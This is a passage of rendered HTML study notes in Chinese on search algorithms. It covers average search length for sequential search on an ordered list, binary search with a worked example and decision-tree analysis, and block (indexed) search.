style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.7936em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1076em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.8769em;vertical-align:-0.7693em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1076em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span> 式中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>q</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">q_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 是到达第 <code>j</code> 个失败结点的概率，在相等查找概率的情形下，它为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">1 / (n + 1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1/</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>；<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>l</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">l_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0197em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 是第 <code>j</code> 个失败结点所在的层数。当 <code>n = 6</code> 时，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>S</mi><msub><mi>L</mi><mtext>不成功</mtext></msub><mo>=</mo><mn>6</mn><mi mathvariant="normal">/</mi><mn>2</mn><mo>+</mo><mn>6</mn><mi mathvariant="normal">/</mi><mn>7</mn><mo>=</mo><mn>3.86</mn></mrow><annotation encoding="application/x-tex">ASL_{\text{不成功}} = 6 / 2 + 6 / 7 = 3.86</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord cjk_fallback mtight">不成功</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">6/2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">6/7</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3.86</span></span></span></span>，比一般的顺序查找算法好一些。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>有序线性表的顺序查找和后面的折半查找的思想是不一样的，且有序线性表的顺序查找中的线性表可以是链式存储结构</p>
</div>
</li>
</ol>
<h4> 折半查找</h4>
<p>折半查找又称 <strong>二分查找</strong>，它仅适用于有序的顺序表。</p>
<p><strong>折半查找的基本思想</strong>：首先将给定值 <code>key</code> 与表中中间位置的元素比较，若相等，则查找成功，返回该元素的存储位置；若不等，则所需查找的元素只能在中间元素以外的前半部分或后半部分（例如：在查找表升序排列时，若给定值 <code>key</code> 大于中间元素，则所查找的元素只可能在后半部分）。然后在缩小的范围内继续进行同样的查找，如此重复，直到找到为止，或确定表中没有所需要查找的元素，则查找不成功，返回查找失败的信息。算法如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>例如：己知 <code>11</code> 个元素的有序表 <code>{7, 10, 13, 16, 19, 29, 32, 33, 37, 41, 43}</code>，要查找值为 <code>11</code> 和 <code>32</code> 的元素，指针 <code>low</code> 和 <code>high</code> 分别指向表的下界和上界，<code>mid</code> 则指向表的中间位置 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌊</mo><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>w</mi><mo>+</mo><mi>h</mi><mi>i</mi><mi>g</mi><mi>h</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>2</mn><mo stretchy="false">⌋</mo></mrow><annotation encoding="application/x-tex">\lfloor (low + high) / 2 \rfloor</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">hi</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">h</span><span class="mclose">)</span><span class="mord">/2</span><span class="mclose">⌋</span></span></span></span>。以下说明查找 <code>11</code> 的过程：</p>
<ul>
<li>第一次查找，将中间位置元素与 <code>key</code> 值比较。因为 <code>11 &lt; 29</code>，说明待查元素若存在，则必在范围 <code>[low, mid - l]</code> 内，令指针 <code>high</code> 指向位置 <code>mid - 1, high = mid - 1 = 5</code>，重新求得 <code>mid = (1 + 5) / 2 = 3</code>，第二次的查找范围为 <code>[1, 5]</code></li>
<li>第二次查找，同样将中间位置元素与 <code>key</code> 值比较。因为 <code>11 &lt; 13</code>，说明待查元素若存在，则必在范围 <code>[low, mid - l]</code> 内，令指针 <code>high</code> 指向位置 <code>mid - 1, high = mid - 1 = 2</code>，重新求得 <code>mid = (1 + 2) / 2 = 1</code>，第三次的查找范围为 <code>[1, 2]</code></li>
<li>第三次查找，将中间位置元素与 <code>key</code> 值比较。因为 <code>11 &gt; 7</code>，说明待查元素若存在，则必在范围 <code>[mid + 1, high]</code> 内。令 <code>low = mid + 1 = 2, mid = (2 + 2) / 2 = 2</code>，第四次的查找范围为 <code>[2, 2]</code></li>
<li>第四次查找，此时子表只含有一个元素，且 <code>10 ≠ 11</code>，故表中不存在待查元素</li>
</ul>
<p>折半查找的过程可用二叉树来描述，称为 <strong>判定树</strong>。用折半查找法查找到给定值的比较次数最多不会超过树的高度。在等概率查找时，查找成功的平均查找长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>S</mi><mi>L</mi><mo>=</mo><mstyle displaystyle="true" scriptlevel="0"><mfrac><mn>1</mn><mi>n</mi></mfrac></mstyle><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>l</mi><mi>i</mi></msub><mo>=</mo><mfrac><mn>1</mn><mi>n</mi></mfrac><mo stretchy="false">(</mo><mn>1</mn><mo>×</mo><mn>1</mn><mo>+</mo><mn>2</mn><mo>×</mo><mn>2</mn><mo>+</mo><mo>…</mo><mo>+</mo><mi>h</mi><mo>×</mo><msup><mn>2</mn><mrow><mi>h</mi><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow><mi>n</mi></mfrac><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>−</mo><mn>1</mn><mo>≈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>−</mo><mn>1</mn></mstyle></mrow><annotation encoding="application/x-tex">ASL = \dfrac{1}{n} \displaystyle\sum_{i=1}^n l_{i} = \dfrac{1}{n} (1 \times 1 + 2 \times 2 + \dotsc + h \times 2^{h-1}) = \dfrac{n + 1}{n} log_{2} (n + 1) - 1 \approx log_{2} (n + 1) - 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0197em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1491em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 式中，<code>h</code> 是树的高度，并且元素个数为 <code>n</code> 时树高 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>=</mo><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">h = \lceil log_{2} (n + 1) \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)⌉</span></span></span></span> 所以，折半查找的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1og_{2}n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>，平均情况下比顺序查找的效率高。</p>
<p>因为折半查找需要方便地定位查找区域，所以它要求线性表必须具有随机存取的特性。因此，该查找法仅适合于顺序存储结构，不适合于链式存储结构，且要求元素按关键字有序排列。</p>
<h4> 分块查找</h4>
<p>分块查找又称 <strong>索引顺序查找</strong>，它吸取了顺序查找和折半查找各自的优点，既有动态结构，又适于快速查找。</p>
<p><strong>分块查找的基本思想</strong>：将查找表分为若干子块。块内的元素可以无序，但块间的元素是有序的，即第一个块中的最大关键字小于第二个块中的所有记录的关键字，第二个块中的最大关键字小于第三个块中的所有记录的关键字，以此类推。再建立一个索引表，索引表中的每个元素含有各块的最大关键字和各块中的第一个元素的地址，索引表按关键字有序排列。</p>
<p>分块查找的过程分为两步：第一步是在索引表中确定待查记录所在的块，可以顺序查找或折半查找索引表；第二步是在块内顺序查找。</p>
<p>分块查找的平均查找长度为索引查找和块内查找的平均长度之和。设索引查找和块内查找的平均查找长度分别为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mi>I</mi></msub></mrow><annotation encoding="application/x-tex">L_{I}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mi>S</mi></msub></mrow><annotation encoding="application/x-tex">L_{S}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，则分块查找的平均查找长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mi>S</mi><mi>L</mi><mo>=</mo><msub><mi>L</mi><mi>I</mi></msub><mo>+</mo><msub><mi>L</mi><mi>S</mi></msub></mrow><annotation encoding="application/x-tex">ASL = L_{I} + L_{S}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p>
